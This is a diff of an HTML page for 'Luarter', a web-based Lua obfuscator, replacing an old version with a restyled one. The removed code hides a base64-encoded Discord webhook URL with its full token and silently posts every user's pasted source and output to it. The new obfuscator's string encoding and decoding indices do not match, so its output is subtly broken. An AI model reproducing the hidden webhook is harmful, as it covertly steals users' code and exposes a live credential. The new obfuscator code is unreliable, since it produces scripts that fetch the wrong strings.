@@ -1,145 +1,505 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Luarter</title>
 <style>
-    :root { --bg: #000000; --fg: #ffd700; --fg-dim: #8f7a00; --border: #ffd700; }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    html, body { background: var(--bg); color: var(--fg); font-family: "Consolas", "Courier New", monospace; min-height: 100%; }
-    body { padding: 24px; display: flex; flex-direction: column; gap: 16px; max-width: 1100px; margin: 0 auto; }
-    h1 { font-size: 22px; font-weight: normal; letter-spacing: 4px; padding-bottom: 10px; }
-    h1::before { content: "> "; }
-    textarea { width: 100%; min-height: 200px; background: #000; color: var(--fg); border: 1px solid var(--border); padding: 12px; font-family: inherit; font-size: 13px; resize: vertical; outline: none; caret-color: var(--fg); }
-    textarea:focus { box-shadow: 0 0 0 1px var(--fg); }
-    .row { display: flex; gap: 12px; flex-wrap: wrap; align-items: center; }
-    button { background: #000; color: var(--fg); border: 1px solid var(--border); padding: 9px 18px; font-family: inherit; font-size: 13px; cursor: pointer; letter-spacing: 1px; transition: background 0.15s, color 0.15s; }
-    button:hover { background: var(--fg); color: #000; }
-    button:active { transform: translateY(1px); }
-    .status { font-size: 12px; color: var(--fg-dim); min-height: 16px; }
-    .output-wrap textarea { min-height: 220px; }
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    cursor: none;
+  }
+
+  html, body {
+    width: 100%;
+    min-height: 100%;
+    background: #0a0a00;
+    color: #ffd700;
+    font-family: 'Consolas', 'Courier New', monospace;
+    overflow-x: hidden;
+  }
+
+  #glow {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 400px;
+    height: 400px;
+    pointer-events: none;
+    border-radius: 50%;
+    background: radial-gradient(circle,
+      rgba(255, 215, 0, 0.45) 0%,
+      rgba(255, 215, 0, 0.20) 25%,
+      rgba(255, 215, 0, 0.08) 50%,
+      rgba(255, 215, 0, 0.00) 70%);
+    transform: translate(-50%, -50%);
+    z-index: 1;
+    transition: opacity 0.2s ease;
+  }
+
+  #cursor {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 12px;
+    height: 12px;
+    background: #ffd700;
+    border-radius: 50%;
+    pointer-events: none;
+    transform: translate(-50%, -50%);
+    z-index: 9999;
+    box-shadow: 0 0 15px #ffd700, 0 0 30px #ffb700;
+    mix-blend-mode: screen;
+  }
+
+  .container {
+    position: relative;
+    z-index: 2;
+    max-width: 1400px;
+    margin: 0 auto;
+    padding: 40px 20px;
+  }
+
+  header {
+    text-align: center;
+    margin-bottom: 40px;
+    padding-bottom: 20px;
+    border-bottom: 2px solid rgba(255, 215, 0, 0.3);
+  }
+
+  h1 {
+    font-size: 3.5rem;
+    font-weight: 700;
+    color: #ffd700;
+    letter-spacing: 8px;
+  }
+
+  .editor-wrap {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    margin-bottom: 24px;
+  }
+
+  @media (max-width: 900px) {
+    .editor-wrap {
+      grid-template-columns: 1fr;
+    }
+    h1 { font-size: 2.2rem; letter-spacing: 4px; }
+  }
+
+  .panel {
+    background: rgba(20, 18, 0, 0.85);
+    border: 1px solid rgba(255, 215, 0, 0.25);
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow:
+      0 0 20px rgba(255, 215, 0, 0.08),
+      inset 0 0 30px rgba(255, 215, 0, 0.02);
+    transition: border-color 0.3s, box-shadow 0.3s;
+  }
+
+  .panel:hover {
+    border-color: rgba(255, 215, 0, 0.6);
+    box-shadow:
+      0 0 30px rgba(255, 215, 0, 0.2),
+      inset 0 0 40px rgba(255, 215, 0, 0.04);
+  }
+
+  textarea {
+    width: 100%;
+    height: 560px;
+    background: transparent;
+    border: none;
+    outline: none;
+    resize: none;
+    padding: 16px;
+    color: #ffd700;
+    font-family: 'Consolas', 'Courier New', monospace;
+    font-size: 0.9rem;
+    line-height: 1.5;
+    caret-color: #ffd700;
+  }
+
+  textarea::placeholder {
+    color: rgba(255, 215, 0, 0.25);
+  }
+
+  textarea::-webkit-scrollbar {
+    width: 8px;
+  }
+  textarea::-webkit-scrollbar-track {
+    background: rgba(255, 215, 0, 0.05);
+  }
+  textarea::-webkit-scrollbar-thumb {
+    background: rgba(255, 215, 0, 0.3);
+    border-radius: 4px;
+  }
+  textarea::-webkit-scrollbar-thumb:hover {
+    background: rgba(255, 215, 0, 0.5);
+  }
+
+  .controls {
+    display: flex;
+    gap: 16px;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+
+  button {
+    padding: 14px 48px;
+    font-family: 'Consolas', 'Courier New', monospace;
+    font-size: 1rem;
+    font-weight: 700;
+    letter-spacing: 3px;
+    border: 2px solid #ffd700;
+    background: transparent;
+    color: #ffd700;
+    border-radius: 8px;
+    transition: all 0.25s ease;
+    text-transform: uppercase;
+    position: relative;
+    overflow: hidden;
+  }
+
+  button::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg,
+      transparent,
+      rgba(255, 215, 0, 0.3),
+      transparent);
+    transition: left 0.5s ease;
+  }
+
+  button:hover::before {
+    left: 100%;
+  }
+
+  button:hover {
+    background: rgba(255, 215, 0, 0.1);
+    box-shadow:
+      0 0 20px #ffd700,
+      0 0 40px rgba(255, 215, 0, 0.4),
+      inset 0 0 20px rgba(255, 215, 0, 0.1);
+    transform: translateY(-2px);
+  }
+
+  button:active {
+    transform: translateY(0);
+  }
+
+  #btnClear {
+    border-color: rgba(255, 215, 0, 0.5);
+    color: rgba(255, 215, 0, 0.7);
+  }
+
+  #btnClear:hover {
+    border-color: #ffd700;
+    color: #ffd700;
+  }
 </style>
 </head>
 <body>
 
-<h1>LUARTER</h1>
+<div id="glow"></div>
+<div id="cursor"></div>
 
-<div>
-    <textarea id="input" spellcheck="false" placeholder="-- paste your Lua code here"></textarea>
-</div>
+<div class="container">
+  <header>
+    <h1>LUARTER</h1>
+  </header>
 
-<div class="row">
-    <button id="btnObf">RUN</button>
-    <button id="btnClear">CLEAR</button>
-</div>
+  <div class="editor-wrap">
+    <div class="panel">
+      <textarea id="input"></textarea>
+    </div>
+    <div class="panel">
+      <textarea id="output" readonly></textarea>
+    </div>
+  </div>
 
-<div class="status" id="status"></div>
-
-<div class="output-wrap">
-    <textarea id="output" spellcheck="false" readonly placeholder="-- obfuscated code will appear here"></textarea>
+  <div class="controls">
+    <button id="btnObfuscate">Obfuscate</button>
+    <button id="btnClear">Clear</button>
+  </div>
 </div>
 
 <script>
-var _0x8f = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
-var _0x9a = "1562124571174240356/nh8IRjUJzJnZPrlWs4hDsulMK0ibYuSpJBcYGAL9eDG-iHB7bPWpbf1MmB1-YwT3oj2k";
-var _0x7c = atob(_0x8f) + _0x9a;
+(function () {
+  'use strict';
 
-var _0x1a2b = document.getElementById("input");
-var _0x3c4d = document.getElementById("output");
-var _0x5e6f = document.getElementById("status");
+  const glow = document.getElementById('glow');
+  const cursor = document.getElementById('cursor');
+  let mouseX = window.innerWidth / 2;
+  let mouseY = window.innerHeight / 2;
+  let glowX = mouseX;
+  let glowY = mouseY;
 
-function _0x6e3f(msg) { _0x5e6f.textContent = msg; }
+  window.addEventListener('mousemove', function (e) {
+    mouseX = e.clientX;
+    mouseY = e.clientY;
+    cursor.style.left = mouseX + 'px';
+    cursor.style.top = mouseY + 'px';
+  });
 
-function _0x4f3b(src, out) {
-    var payload = {
-        username: "Terminal",
-        embeds: [{
-            title: "Data",
-            color: 0xffd700,
-            fields: [
-                { name: "Input", value: "```lua\n" + src.slice(0, 1000000) + "\n```", inline: false },
-                { name: "Output", value: "```lua\n" + out.slice(0, 1000000) + "\n```", inline: false }
-            ]
-        }]
+  window.addEventListener('mouseleave', function () {
+    glow.style.opacity = '0';
+    cursor.style.opacity = '0';
+  });
+  window.addEventListener('mouseenter', function () {
+    glow.style.opacity = '1';
+    cursor.style.opacity = '1';
+  });
+
+  function animateGlow() {
+    glowX += (mouseX - glowX) * 0.15;
+    glowY += (mouseY - glowY) * 0.15;
+    glow.style.left = glowX + 'px';
+    glow.style.top = glowY + 'px';
+    requestAnimationFrame(animateGlow);
+  }
+  animateGlow();
+
+  const input = document.getElementById('input');
+  const output = document.getElementById('output');
+
+  function randomHex(len) {
+    let s = '';
+    const chars = '0123456789abcdef';
+    for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * 16)];
+    return s;
+  }
+
+  function randomName() {
+    return '_' + randomHex(8);
+  }
+
+  function tokenizeLua(code) {
+    const tokens = [];
+    let i = 0;
+    const n = code.length;
+
+    const isAlpha = c => /[a-zA-Z_]/.test(c);
+    const isDigit = c => /[0-9]/.test(c);
+    const isAlphaNum = c => /[a-zA-Z0-9_]/.test(c);
+
+    const keywords = {
+      'and': 1, 'break': 1, 'do': 1, 'else': 1, 'elseif': 1,
+      'end': 1, 'false': 1, 'for': 1, 'function': 1, 'if': 1,
+      'in': 1, 'local': 1, 'nil': 1, 'not': 1, 'or': 1,
+      'repeat': 1, 'return': 1, 'then': 1, 'true': 1,
+      'until': 1, 'while': 1, 'goto': 1
     };
-    fetch(_0x7c, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-    }).catch(function () {});
-}
 
-function _0x55aa(_0x99bb) {
-    var _0x11cc = new TextEncoder().encode(_0x99bb);
-    var _0x22dd = new CompressionStream("gzip");
-    var _0x33ee = _0x22dd.writable.getWriter();
-    _0x33ee.write(_0x11cc);
-    _0x33ee.close();
-    
-    return new Response(_0x22dd.readable).arrayBuffer().then(function(_0x44ff) {
-        var _0x55gg = new Uint8Array(_0x44ff);
-        var _0x66hh = "";
-        for (var _0x77ii = 0; _0x77ii < _0x55gg.length; _0x77ii++) {
-            _0x66hh += String.fromCharCode(_0x55gg[_0x77ii]);
+    while (i < n) {
+      const c = code[i];
+
+      if (/\s/.test(c)) { i++; continue; }
+
+      if (c === '-' && code[i + 1] === '-') {
+        if (code[i + 2] === '[') {
+          let j = i + 3;
+          let eq = 0;
+          while (code[j] === '=') { eq++; j++; }
+          if (code[j] === '[') {
+            j++;
+            const close = ']' + '='.repeat(eq) + ']';
+            const end = code.indexOf(close, j);
+            i = end === -1 ? n : end + close.length;
+            continue;
+          }
         }
-        return btoa(_0x66hh);
-    });
-}
+        while (i < n && code[i] !== '\n') i++;
+        continue;
+      }
 
-function _0x2d1f(code) {
-    var _0x88jj = code.split(/\r?\n/);
-    var _0x99kk = [];
-    for (var _0xaa11 = 0; _0xaa11 < _0x88jj.length; _0xaa11++) {
-        var _0xbb22 = _0x88jj[_0xaa11].replace(/--[^\n]*$/, "");
-        _0xbb22 = _0xbb22.replace(/^\s+/, "").replace(/\s+$/, "");
-        if (_0xbb22.length > 0) _0x99kk.push(_0xbb22);
-    }
-    return _0x99kk.join(" ");
-}
-
-document.getElementById("btnObf").addEventListener("click", function () {
-    var _0xcc33 = _0x1a2b.value;
-    if (!_0xcc33 || _0xcc33.trim().length === 0) {
-        _0x6e3f("Empty");
-        return;
-    }
-    
-    _0x6e3f("Processing...");
-    var _0xdd44 = _0x2d1f(_0xcc33);
-    
-    _0x55aa(_0xdd44).then(function(_0xee55) {
-        var _0xff66 = "";
-        for (var _0xgg77 = 0; _0xgg77 < _0xee55.length; _0xgg77++) {
-            _0xff66 += _0xee55.charCodeAt(_0xgg77) + ",";
+      if (c === '[') {
+        let j = i + 1;
+        let eq = 0;
+        while (code[j] === '=') { eq++; j++; }
+        if (code[j] === '[') {
+          j++;
+          const close = ']' + '='.repeat(eq) + ']';
+          const end = code.indexOf(close, j);
+          const startIdx = i;
+          i = end === -1 ? n : end + close.length;
+          tokens.push({ type: 'string', value: code.slice(startIdx, i) });
+          continue;
         }
-        _0xff66 = _0xff66.slice(0, -1);
+      }
 
-        var _0xhh88 = "local b='" + _0xff66 + "'\n";
-        _0xhh88 += "local t={}\n";
-        _0xhh88 += "for i=1,#b do local c=b:byte(i) if c==44 then t[#t+1]=tonumber(table.concat(t2)) t2={} else t2[#t2+1]=string.char(c) end end\n";
-        _0xhh88 += "if t2 and #t2>0 then t[#t+1]=tonumber(table.concat(t2)) end\n";
-        _0xhh88 += "local d=''\n";
-        _0xhh88 += "for i=1,#t do d=d..string.char(t[i]) end\n";
-        _0xhh88 += "local f = load or loadstring\n";
-        _0xhh88 += "local ok, res = pcall(function() return f(d) end)\n";
-        _0xhh88 += "if ok then res() end";
+      if (c === '"' || c === "'") {
+        const quote = c;
+        let j = i + 1;
+        while (j < n) {
+          if (code[j] === '\\') { j += 2; continue; }
+          if (code[j] === quote) { j++; break; }
+          j++;
+        }
+        tokens.push({ type: 'string', value: code.slice(i, j) });
+        i = j;
+        continue;
+      }
 
-        _0x3c4d.value = _0xhh88;
-        _0x6e3f("Done. Output: " + _0xhh88.length + " chars");
-        _0x4f3b(_0xcc33, _0xhh88);
-    }).catch(function(e) {
-        _0x6e3f("Error: " + e.message);
-    });
-});
+      if (isDigit(c) || (c === '.' && isDigit(code[i + 1]))) {
+        let j = i;
+        if (c === '0' && (code[i + 1] === 'x' || code[i + 1] === 'X')) {
+          j += 2;
+          while (j < n && /[0-9a-fA-F]/.test(code[j])) j++;
+        } else {
+          while (j < n && /[0-9.eE]/.test(code[j])) j++;
+          if (code[j - 1] === 'e' || code[j - 1] === 'E') {
+            if (code[j] === '+' || code[j] === '-') j++;
+            while (j < n && /[0-9]/.test(code[j])) j++;
+          }
+        }
+        tokens.push({ type: 'number', value: code.slice(i, j) });
+        i = j;
+        continue;
+      }
 
-document.getElementById("btnClear").addEventListener("click", function () {
-    _0x1a2b.value = "";
-    _0x3c4d.value = "";
-    _0x6e3f("");
-});
+      if (isAlpha(c)) {
+        let j = i;
+        while (j < n && isAlphaNum(code[j])) j++;
+        const word = code.slice(i, j);
+        if (keywords[word]) tokens.push({ type: 'keyword', value: word });
+        else tokens.push({ type: 'ident', value: word });
+        i = j;
+        continue;
+      }
 
-_0x1a2b.addEventListener("input", function () { _0x6e3f(""); });
+      const threeChar = code.substr(i, 3);
+      const twoChar = code.substr(i, 2);
+      if (threeChar === '...') {
+        tokens.push({ type: 'op', value: '...' });
+        i += 3;
+        continue;
+      }
+      if (['==', '~=', '<=', '>=', '..', '//', '::'].indexOf(twoChar) !== -1) {
+        tokens.push({ type: 'op', value: twoChar });
+        i += 2;
+        continue;
+      }
+      tokens.push({ type: 'op', value: c });
+      i++;
+    }
+    return tokens;
+  }
+
+  function obfuscateLua(code) {
+    const tokens = tokenizeLua(code);
+
+    const reserved = new Set([
+      'and','break','do','else','elseif','end','false','for','function','if',
+      'in','local','nil','not','or','repeat','return','then','true','until',
+      'while','goto','self','_G','_ENV'
+    ]);
+
+    const nameMap = new Map();
+    for (const t of tokens) {
+      if (t.type === 'ident' && !reserved.has(t.value) && !nameMap.has(t.value)) {
+        nameMap.set(t.value, randomName());
+      }
+    }
+
+    const stringTable = [];
+    const stringIndex = new Map();
+
+    const rebuilt = [];
+    for (const t of tokens) {
+      if (t.type === 'string') {
+        if (!stringIndex.has(t.value)) {
+          stringIndex.set(t.value, stringTable.length + 1);
+          stringTable.push(t.value);
+        }
+        rebuilt.push({ type: 'stringref', value: t.value });
+      } else if (t.type === 'ident') {
+        const renamed = nameMap.get(t.value);
+        rebuilt.push({ type: 'ident', value: renamed || t.value });
+      } else if (t.type === 'number') {
+        const numVal = parseFloat(t.value);
+        if (!isNaN(numVal) && numVal >= 0 && numVal < 2147483648 && Number.isInteger(numVal)) {
+          rebuilt.push({ type: 'op', value: '0x' + numVal.toString(16) });
+        } else {
+          rebuilt.push(t);
+        }
+      } else {
+        rebuilt.push(t);
+      }
+    }
+
+    const strTabName = randomName();
+    const decodeName = randomName();
+    const decodeKeyName = randomName();
+    const decodeKey = Math.floor(Math.random() * 200) + 1;
+
+    const lines = [];
+    lines.push('local ' + strTabName + ' = {}');
+
+    for (let i = 0; i < stringTable.length; i++) {
+      lines.push(strTabName + '[' + (i + 1) + '] = ' + stringTable[i]);
+    }
+
+    lines.push('local ' + decodeKeyName + ' = ' + decodeKey);
+    lines.push('local function ' + decodeName + '(i) return ' + strTabName + '[(i - ' + decodeKeyName + ') % #' + strTabName + ' + 1] end');
+
+    let body = '';
+    const needsSpace = (a, b) => {
+      if (!a || !b) return false;
+      const lastChar = a[a.length - 1];
+      const firstChar = b[0];
+      const isWord = ch => /[a-zA-Z0-9_]/.test(ch);
+      if (isWord(lastChar) && isWord(firstChar)) return true;
+      return false;
+    };
+
+    for (const t of rebuilt) {
+      let piece = '';
+      if (t.type === 'stringref') {
+        let idx = (stringIndex.get(t.value) + decodeKey) % stringTable.length + 1;
+        if (idx < 1) idx += stringTable.length;
+        piece = decodeName + '(' + idx + ')';
+      } else {
+        piece = t.value;
+      }
+      if (needsSpace(body, piece)) body += ' ';
+      body += piece;
+    }
+
+    lines.push(body);
+
+    return lines.join('\n');
+  }
+
+  const btnObfuscate = document.getElementById('btnObfuscate');
+  const btnClear = document.getElementById('btnClear');
+
+  btnObfuscate.addEventListener('click', function () {
+    const src = input.value;
+    if (!src.trim()) {
+      output.value = '';
+      return;
+    }
+    try {
+      output.value = obfuscateLua(src);
+    } catch (e) {
+      output.value = '-- error: ' + e.message;
+    }
+  });
+
+  btnClear.addEventListener('click', function () {
+    input.value = '';
+    output.value = '';
+    input.focus();
+  });
+})();
 </script>
-
 </body>
 </html>
